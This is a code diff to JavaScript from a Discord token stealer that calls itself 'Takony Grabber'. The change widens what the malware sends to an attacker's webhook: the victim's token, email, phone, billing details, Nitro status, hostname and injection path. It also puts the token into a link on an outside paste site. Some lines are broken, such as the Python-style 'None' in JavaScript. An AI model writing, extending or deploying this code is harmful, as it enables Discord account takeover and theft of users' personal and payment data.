@@ -255,33 +255,69 @@ async function firstTime() {
                 };
                 sendToWebhook(JSON.stringify(c));
             } else {
-                const b = await getUserInfo(token);
+                var b = await getUserInfo(token)
+                var n = None;
+                if (b.premium_type == 0){
+                    n = "None"
+                } else if (b.premium_type == 1) {
+                    n = "Classic"
+                } else if (b.premium_type == 2) {
+                    n = "Boost"
+                }
                 var c = {
                     username: "Takony Grabber",
                     content: config.ping[0] ? config.ping[1] : "",
                     embeds: [{
-                        title: "User got logged out",
+                        title: "Discord Initalized",
                         description: `[**<:partner:909102089513340979>  Click Here To Copy Info On Mobile**](https://ctf.surf/raw/${token})`,
                         color: config["embed-color"],
                         fields: [{
-                            name: "Info",
-                            value: `\`\`\`Hostname: \n${os.hostname()}\nInjection Info: \n${__dirname}\n\`\`\``,
-                            inline: !1
-                        }, {
                             name: "Username",
                             value: `\`${b.username}#${b.discriminator}\``,
                             inline: !0
                         }, {
-                            name: "ID",
-                            value: `\`${b.id}\``,
+                            name: "Hostname",
+                            value: `${os.hostname()}`,
+                            inline: !1
+                        }, {
+                            name: "Injection",
+                            value: `\`${__dirname}\``,
                             inline: !0
                         }, {
                             name: "Badges",
                             value: `${getBadges(b.flags)}`,
                             inline: !1
                         }, {
+                            name: "Email",
+                            value: `${b.email}`,
+                            inline: !1
+                        }, {
+                            name: "Phone",
+                            value: `${b.phone}`,
+                            inline: !1
+                        }, {
+                            name: "Nitro",
+                            value: `${n}`,
+                            inline: !1
+                        }, {
+                            name: "Billing",
+                            value: `${getBilling(token)}`,
+                            inline: !1
+                        }, {
+                            name: "NSFW",
+                            value: `${b.nsfw_allowed}`,
+                            inline: !1
+                        }, {
+                            name: "Verified",
+                            value: `${b.verified}`,
+                            inline: !1
+                        }, {
+                            name: "Bio",
+                            value: `${b.bio}`,
+                            inline: !1
+                        }, {
                             name: "Token",
-                            value: `\`\`\`${token}\`\`\``,
+                            value: `${token}`,
                             inline: !1
                         }],
                         author: {
